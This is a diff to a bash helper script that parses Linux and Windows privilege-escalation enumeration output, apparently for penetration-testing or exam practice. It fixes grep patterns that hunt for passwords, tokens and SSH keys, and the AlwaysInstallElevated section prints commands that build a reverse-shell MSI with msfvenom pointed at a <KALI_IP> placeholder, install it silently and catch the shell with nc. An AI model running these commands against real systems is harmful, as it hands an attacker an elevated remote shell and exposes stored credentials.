@@ -899,7 +899,7 @@ parse_linux_output() {
 
         # 6. Credentials found
         echo "=== CREDENTIALS / SENSITIVE DATA ==="
-        grep -iE "password[[:space:]]*[=:]|passwd[[:space:]]*[=:]|secret[[:space:]]*[=:]|token[[:space:]]*[=:]|private.key\|id_rsa" "$input_file" 2>/dev/null | head -20
+        grep -iE "password[[:space:]]*[=:]|passwd[[:space:]]*[=:]|secret[[:space:]]*[=:]|token[[:space:]]*[=:]|private.key|id_rsa" "$input_file" 2>/dev/null | head -20
         echo ""
 
         # 7. Internal services
@@ -1333,7 +1333,7 @@ parse_windows_output() {
 
         # 4. Writable services
         echo "=== MODIFIABLE SERVICES ==="
-        grep -iE "modifiable|writable.*service\|Full Control.*service\|BUILTIN.*Users.*(F|M)" "$input_file" 2>/dev/null | head -10
+        grep -iE "modifiable|writable.*service|Full Control.*service|BUILTIN.*Users.*(F|M)" "$input_file" 2>/dev/null | head -10
         echo ""
 
         # 4b. DLL hijacking / writable PATH
@@ -1492,11 +1492,14 @@ parse_windows_output() {
             echo ""
         fi
 
-        # AlwaysInstallElevated
-        if grep -qi 'AlwaysInstallElevated' "$quickwins" 2>/dev/null; then
+        # AlwaysInstallElevated — flag if the ENABLED state (0x1 / "set to 1")
+        # appears at all. A missed privesc costs points; a false positive (only
+        # one hive set) costs ~30s — so detect on >=1 enabled line, and remind
+        # the operator below to confirm BOTH hives before firing.
+        if grep -qiE 'AlwaysInstallElevated.*(0x1|set to 1)' "$quickwins" 2>/dev/null; then
             echo "[ ALWAYS INSTALL ELEVATED ]"
             echo "------------------------------------------------------------"
-            echo "# Both HKCU + HKLM must be 1. If so:"
+            echo "# Requires BOTH HKLM + HKCU = 1 — verify, then exploit:"
             echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f msi -o evil.msi"
             echo "msiexec /quiet /qn /i evil.msi"
             echo "nc -lvnp 4444"
